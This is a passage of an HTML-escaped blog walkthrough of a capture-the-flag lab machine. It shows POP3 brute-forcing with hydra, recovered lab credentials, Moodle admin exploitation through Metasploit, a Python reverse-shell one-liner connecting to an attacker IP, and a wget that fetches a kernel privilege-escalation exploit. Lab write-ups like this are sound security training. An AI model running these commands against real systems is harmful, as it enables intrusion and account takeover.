__ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675389865498.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675389870691.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nI find its login page,try to intrude it.\nAuthorization is made up of user:password.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675389847203.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390018821.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390162371.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nFind nothing.&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-2-view-home-page-source\&quot;&gt;step-2 View home page source.&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-2-view-home-page-source\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390345344.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390355645.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;code&gt;&amp;#x26;#73;&amp;#x26;#110;&amp;#x26;#118;&amp;#x26;#105;&amp;#x26;#110;&amp;#x26;#99;&amp;#x26;#105;&amp;#x26;#98;&amp;#x26;#108;&amp;#x26;#101;&amp;#x26;#72;&amp;#x26;#97;&amp;#x26;#99;&amp;#x26;#107;&amp;#x26;#51;&amp;#x26;#114;&lt;/code&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675390815369.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nIt’s unicode,decode it as html,I get ‘InvincibleHack3r’.And in source page,i known that the user is boris.Attention please,‘boris’ not ‘Boris’.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675391828534.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;View source code of this page.In the end i find an explanatory note.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675391692695.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-3-pop3\&quot;&gt;step-3 POP3&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-3-pop3\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;From nmap result,55007 is pop3 port.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675393082037.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nUse burpsuite to send packet.It response us slowly,be pacient.\nIntrude pop3 password.I guess its username is ‘natalya’ or ‘boris’.&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hydra -s 55007 -L username.txt  -P /usr/share/set/src/fasttrack/wordlist.txt -e nsr -t 22 192.168.124.44 pop3&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Then I get password.Attention,intrude it successfully only with /usr/share/set/src/fasttrack/wordlist.txt.\n&lt;code&gt;natalya:bird&lt;/code&gt;\n&lt;code&gt;boris:secret1!&lt;/code&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-4-login-mailbox\&quot;&gt;step-4 Login mailbox&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-4-login-mailbox\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;telnet 192.168.124.44 55007&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;user natalya&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pass bird&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;+OK 2 messages:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1 631&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;2 1048&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;retr 1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;I find two mails.And the second is critical.\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675394170762.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675394314719.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-5-login-in-gnocertdir\&quot;&gt;step-5 Login in gnocertdir&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-5-login-in-gnocertdir\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Edit /etc/hosts\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675394962917.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nVisit servernaya-station.com/gnocertdir\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675395021833.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nThe username and password has be shown in the second mail.\nI find a mail of doak.Try to intrude doak’s mailbox.\nThen Get doak:goat\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675395868856.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nFind another account of this system in doak’s mailbox.\nusername: dr_doak\npassword: 4England!\nSign in system with this account.\nI find a file named secret.txt.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675396334057.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nDownload picture for-007.jpg\nOpen this picture in notepad++,something intersting show.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675396627851.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nDecode ‘eFdpbnRlcjE5OTV4IQ==‘,get ‘xWinter1995x!‘&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-6-moodlecms-exploitation\&quot;&gt;step-6 Moodlecms exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-6-moodlecms-exploitation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;xWinter1995x! is the password of admin\nThe version of moodle cms is 2.2.3\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675845464385.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nIt seems that we can use msf to get shell.\nBefore exploit it,set text editor.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675905870571.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675905558594.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-7-privilege-escalation\&quot;&gt;Step-7 Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-7-privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;It’s www-data now\nSearch vulnerability to escalate privilege.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit linux ubuntu 3.13&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675906171442.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nUse 37292.c\nThe absolute path of shellcode is /usr/share/exploitdb/exploits/\nmove it to /home/kali\nedit  37292.c,because there is no gcc in  target host .Use cc\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675911223227.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;change shell to meterpreter&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;use post/multi/manage/shell_to_meterpreter&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set session 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exploit&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sessions -i 2&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;upload 37292.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;How to use 37292.c will be described in it’s code.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chmod 777 37292.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cc -o exp 37292.c&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./exp&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675912183070.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method-2-reverse-shell\&quot;&gt;Method-2 Reverse shell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-2-reverse-shell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;step-6-moodlecms-exploitation-1\&quot;&gt;Step-6 Moodlecms exploitation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-6-moodlecms-exploitation-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;In ‘Site administration-Server-System paths’,I find a web which can be used to upload shellcode.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.124.4\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675912534581.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nlisten port 6666 in vps.\n&lt;code&gt;nc lvnp 6666&lt;/code&gt;\ncheck spell\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675912972431.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nThen will get a shell\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675913050473.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;step-7-privilege-escalation-1\&quot;&gt;Step-7 Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-7-privilege-escalation-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Turn shell to python shell&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675914702007.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python3 -m http.server 5555&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;In the shell\n&lt;code&gt;wget http://192.168.124.5:5555/37292.c&lt;/code&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675329659408.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 